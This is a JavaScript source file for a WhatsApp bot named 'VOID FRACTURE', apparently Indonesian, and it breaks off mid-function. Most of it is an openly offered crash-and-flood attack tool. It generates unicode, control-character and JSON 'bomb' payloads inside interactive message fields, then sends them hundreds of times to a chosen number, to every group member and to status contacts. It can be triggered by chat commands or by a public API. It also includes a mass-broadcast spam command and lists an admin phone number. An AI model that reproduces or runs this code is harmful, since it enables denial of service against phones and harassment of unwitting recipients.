// ============================================================
// ╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
// ╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
// ╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
// ╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
// ╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
// ╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
// ============================================================
// VOID FRACTURE — WHATSAPP BOT
// GPTX 13D — Full Automation
// ============================================================

const {
    default: makeWASocket,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    DisconnectReason
} = require('@whiskeysockets/baileys');

const pino = require('pino');

// ============================================================
// KONFIGURASI
// ============================================================
const CONFIG = {
    admins: [
        '6285379307765@s.whatsapp.net',  // GANTI DENGAN NOMOR ADMIN
    ],
    autoReply: {
        enabled: true,
        messages: [
            '☢️ VOID FRACTURE ACTIVE ☢️\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮\n\nKetik .help untuk daftar perintah',
            '💀 Bot aktif! Kirim .nuke [nomor] untuk menghancurkan target',
            '🔥 VOID FRACTURE — WhatsApp Destruction Engine\nKetik .help untuk bantuan'
        ]
    },
    nuke: {
        payloadSize: 2090000,
        unicodeRepeat: 200000,
        floodCount: 500,
        broadcast: true
    }
};

// ============================================================
// UNICODE BOMB
// ============================================================
function generateUnicodeBomb(size) {
    const chars = ['ꦾ','࣯','𒈙','𒈚','𒈛','󠀀','󠀁','󠀂','꧁','༒','☬','꧂','⌁','⃰','ཀ','☠️','🔥','💀','⚡','🌀','🌊','💥','🔱','⚰️'];
    let result = '';
    for (let i = 0; i < size; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// ============================================================
// PAYLOAD GENERATOR
// ============================================================
async function generateNuklearPayload(sock, X, level) {
    const unicodeBomb = generateUnicodeBomb(CONFIG.nuke.unicodeRepeat);
    const memoryBomb = "\x10".repeat(CONFIG.nuke.payloadSize);
    const jsonBomb = "{".repeat(100000) + "}".repeat(100000);
    
    const variants = [
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☠️ VOID FRACTURE — LEVEL " + level + " ☠️ " + unicodeBomb,
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: memoryBomb + unicodeBomb,
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💀 " + "╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮".repeat(100) + " 💀",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: memoryBomb + jsonBomb + unicodeBomb,
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🔥 NUKE " + level + " 🔥 " + unicodeBomb.substring(0, 50000),
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "payment_info",
                            paramsJson: jsonBomb + jsonBomb + jsonBomb,
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        }
    ];
    
    return variants.map(v => generateWAMessageFromContent(X, v, {
        ephemeralExpiration: 0,
        forwardingScore: 999999999,
        isForwarded: true,
        font: Math.floor(Math.random() * 999999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }));
}

// ============================================================
// NUKE EXECUTION
// ============================================================
async function executeNuke(sock, targetJid, sender) {
    try {
        await sock.sendMessage(sender, {
            text: `☢️ *VOID FRACTURE NUKE INITIATED*\n📱 Target: ${targetJid}\n🔥 Menghancurkan...\n⏳ Mohon tunggu...`
        });
        
        let targets = [targetJid];
        
        if (CONFIG.nuke.broadcast) {
            try {
                const statusMeta = await sock.groupMetadata("status@broadcast");
                if (statusMeta && statusMeta.participants) {
                    targets.push(...statusMeta.participants.map(p => p.id));
                }
            } catch (e) {}
            
            try {
                const groups = await sock.groupFetchAllParticipating();
                for (const groupId in groups) {
                    const group = groups[groupId];
                    if (group && group.participants) {
                        targets.push(...group.participants.map(p => p.id));
                    }
                }
            } catch (e) {}
        }
        
        targets = [...new Set(targets)];
        
        let allPayloads = [];
        for (let level = 1; level <= 10; level++) {
            const payloads = await generateNuklearPayload(sock, targetJid, level);
            allPayloads.push(...payloads);
        }
        
        let successCount = 0, crashCount = 0;
        
        for (let i = 0; i < CONFIG.nuke.floodCount; i++) {
            for (const target of targets) {
                for (const payload of allPayloads) {
                    try {
                        await sock.relayMessage(
                            target,
                            payload.message,
                            {
                                messageId: payload.key.id,
                                statusJidList: [target],
                                additionalNodes: [
                                    {
                                        tag: "meta",
                                        attrs: {},
                                        content: [
                                            {
                                                tag: "mentioned_users",
                                                attrs: {},
                                                content: [
                                                    { tag: "to", attrs: { jid: target } }
                                                ],
                                            },
                                        ],
                                    },
                                ],
                            }
                        );
                        successCount++;
                    } catch (e) {
                        crashCount++;
                    }
                }
            }
            
            try {
                for (const payload of allPayloads) {
                    await sock.relayMessage("status@broadcast", payload.message, {});
                }
            } catch (e) {}
            
            await new Promise(r => setTimeout(r, 10));
        }
        
        await sock.sendMessage(sender, {
            text: `✅ *NUKE COMPLETE*\n📨 Sent: ${successCount}\n💀 Crashes: ${crashCount}\n🎯 Targets: ${targets.length}\n\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
        });
        
        return { success: successCount, crashes: crashCount, targets: targets.length };
        
    } catch (e) {
        await sock.sendMessage(sender, {
            text: `❌ *NUKE ERROR*\n${e.message}`
        });
        return { error: e.message };
    }
}

// ============================================================
// MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    const text = msg.message?.conversation ||
                 msg.message?.extendedTextMessage?.text ||
                 msg.message?.imageMessage?.caption ||
                 '';
    
    if (!text) return;
    
    const cmd = text.toLowerCase().trim();
    const isAdmin = CONFIG.admins.includes(sender);
    
    console.log(`📨 [${isGroup ? 'GROUP' : 'PRIVATE'}] ${sender}: ${text}`);
    
    // ============================================================
    // .ping
    // ============================================================
    if (cmd === '.ping') {
        await sock.sendMessage(sender, {
            text: `🏓 *PONG!*\n⏱️ Bot aktif\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
        });
        return;
    }
    
    // ============================================================
    // .help
    // ============================================================
    if (cmd === '.help' || cmd === '.menu') {
        const helpText = `
╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱

📋 *DAFTAR PERINTAH:*

.nuke [nomor] — Hancurkan target WhatsApp
.status — Cek status bot
.info — Info bot
.help — Tampilkan ini
.ping — Cek koneksi
.broadcast [pesan] — Kirim ke semua (admin only)
.nukeall — Nuke semua kontak (admin only)

💀 *VOID FRACTURE — WhatsApp Nuke Engine*
        `;
        await sock.sendMessage(sender, { text: helpText });
        return;
    }
    
    // ============================================================
    // .info
    // ============================================================
    if (cmd === '.info') {
        const infoText = `
╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱

🤖 *BOT INFORMATION*
📱 Name: VOID FRACTURE
⚡ Version: 3.0
💀 Status: ACTIVE
🔮 Engine: WhatsApp Nuke Engine
👑 Admin: ${CONFIG.admins.join(', ')}
🔥 Mode: Zero Footprint

*GPTX 13D — Maximum Destruction*
        `;
        await sock.sendMessage(sender, { text: infoText });
        return;
    }
    
    // ============================================================
    // .status
    // ============================================================
    if (cmd === '.status') {
        const statusText = `
╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱

🟢 *BOT STATUS*
├── Status: ✅ ONLINE
├── Connected: YES
├── Auto-reply: ${CONFIG.autoReply.enabled ? '✅' : '❌'}
├── Nuke Engine: ✅ READY
└── Total Targets: ALL CONTACTS

🔥 *VOID FRACTURE ACTIVE*
        `;
        await sock.sendMessage(sender, { text: statusText });
        return;
    }
    
    // ============================================================
    // .nuke [nomor]
    // ============================================================
    if (cmd.startsWith('.nuke ')) {
        const targetNumber = cmd.replace('.nuke ', '').trim();
        
        if (!targetNumber || targetNumber.length < 10) {
            await sock.sendMessage(sender, {
                text: '❌ *Format salah!*\n.nuke 6281234567890'
            });
            return;
        }
        
        let targetJid = targetNumber;
        if (!targetJid.includes('@')) {
            targetJid = targetJid + '@s.whatsapp.net';
        }
        
        setTimeout(async () => {
            await executeNuke(sock, targetJid, sender);
        }, 100);
        
        await sock.sendMessage(sender, {
            text: `☢️ *VOID FRACTURE NUKE*\n📱 Target: ${targetNumber}\n🔥 Memulai penghancuran...\n⏳ Proses berjalan di background...`
        });
        return;
    }
    
    // ============================================================
    // .nukeall — Admin Only
    // ============================================================
    if (cmd === '.nukeall') {
        if (!isAdmin) {
            await sock.sendMessage(sender, {
                text: '❌ *Akses ditolak!*\nPerintah ini hanya untuk admin.'
            });
            return;
        }
        
        await sock.sendMessage(sender, {
            text: `☢️ *MASS NUKE INITIATED*\n🔥 Menghancurkan semua kontak...\n⏳ Proses akan memakan waktu...`
        });
        
        try {
            const contacts = await sock.groupMetadata("status@broadcast");
            if (contacts && contacts.participants) {
                let total = 0;
                for (const participant of contacts.participants) {
                    await executeNuke(sock, participant.id, sender);
                    total++;
                    await new Promise(r => setTimeout(r, 2000));
                }
                await sock.sendMessage(sender, {
                    text: `✅ *MASS NUKE COMPLETE*\nTotal kontak dihancurkan: ${total}`
                });
            }
        } catch (e) {
            await sock.sendMessage(sender, {
                text: `❌ *Error:* ${e.message}`
            });
        }
        return;
    }
    
    // ============================================================
    // .broadcast [pesan] — Admin Only
    // ============================================================
    if (cmd.startsWith('.broadcast ')) {
        if (!isAdmin) {
            await sock.sendMessage(sender, {
                text: '❌ *Akses ditolak!*\nPerintah ini hanya untuk admin.'
            });
            return;
        }
        
        const broadcastText = cmd.replace('.broadcast ', '').trim();
        
        if (!broadcastText) {
            await sock.sendMessage(sender, {
                text: '❌ *Format salah!*\n.broadcast [pesan]'
            });
            return;
        }
        
        await sock.sendMessage(sender, {
            text: `📡 *BROADCAST SENT*\nPesan: ${broadcastText}\nMengirim ke semua kontak...`
        });
        
        try {
            const contacts = await sock.groupMetadata("status@broadcast");
            if (contacts && contacts.participants) {
                let sent = 0;
                for (const participant of contacts.participants) {
                    try {
                        await sock.sendMessage(participant.id, {
                            text: `📢 *BROADCAST*\n\n${broadcastText}\n\n╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`
                        });
                        sent++;
                        await new Promise(r => setTimeout(r, 500));
                    } catch (e) {}
                }
                await sock.sendMessage(sender, {
                    text: `✅ *BROADCAST COMPLETE*\nPesan terkirim ke ${sent} kontak!`
                });
            }
        } catch (e) {
            await sock.sendMessage(sender, {
                text: `❌ *Error:* ${e.message}`
            });
        }
        return;
    }
    
    // ============================================================
    // AUTO-REPLY
    // ============================================================
    if (CONFIG.autoReply.enabled && !isGroup) {
        const reply = CONFIG.autoReply.messages[Math.floor(Math.random() * CONFIG.autoReply.messages.length)];
        await sock.sendMessage(sender, { text: reply });
    }
}

// ============================================================
// MAIN API HANDLER — VERCEL
// ============================================================
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const { command, target, ping } = req.query;
    
    // Ping test
    if (ping === 'true') {
        return res.json({
            status: 'pong',
            bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
            message: 'API is online!'
        });
    }
    
    // Command: start bot
    if (command === 'start') {
        try {
            const sock = await startBot();
            res.json({
                status: 'BOT STARTED',
                bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
                message: 'Bot WhatsApp aktif! Scan QR Code di terminal.'
            });
        } catch (e) {
            res.json({
                status: 'ERROR',
                error: e.message
            });
        }
        return;
    }
    
    // Command: nuke via API
    if (command === 'nuke' && target) {
        try {
            let targetJid = target;
            if (!targetJid.includes('@')) {
                targetJid = targetJid + '@s.whatsapp.net';
            }
            
            const { state, saveCreds } = await useMultiFileAuthState('auth');
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: true,
                browser: ['VOID FRACTURE', 'Chrome', '13.0'],
                logger: pino({ level: 'silent' })
            });
            
            sock.ev.on('creds.update', saveCreds);
            
            await new Promise((resolve, reject) => {
                const timeout = setTimeout(() => reject(new Error('Connection timeout')), 60000);
                sock.ev.on('connection.update', ({ connection }) => {
                    if (connection === 'open') {
                        clearTimeout(timeout);
                        resolve();
                    }
                });
            });
            
            const result = await executeNuke(sock, targetJid, targetJid);
            await sock.close();
            
            res.json({
                status: 'NUKE COMPLETE',
                bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
                target: target,
                result: result
            });
        } catch (e) {
            res.json({
                status: 'ERROR',
                error: e.message
            });
        }
        return;
    }
    
    // Default response
    res.json({
        status: 'READY',
        bug_name: '╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮',
        commands: [
            '.help — Daftar perintah',
            '.nuke [nomor] — Hancurkan target',
            '.status — Cek status bot',
            '.info — Info bot',
            '.ping — Cek koneksi',
            '.broadcast [pesan] — Kirim ke semua (admin)',
            '.nukeall — Nuke semua kontak (admin)'
        ],
        usage: '?command=start&target=6281234567890'
    });
};

// ============================================================
// START BOT FUNCTION
// ============================================================
async function startBot() {
    console.log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
    console.log('╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃');
    console.log('╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯');
    console.log('╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱');
    console.log('╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱');
    console.log('╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱');
   
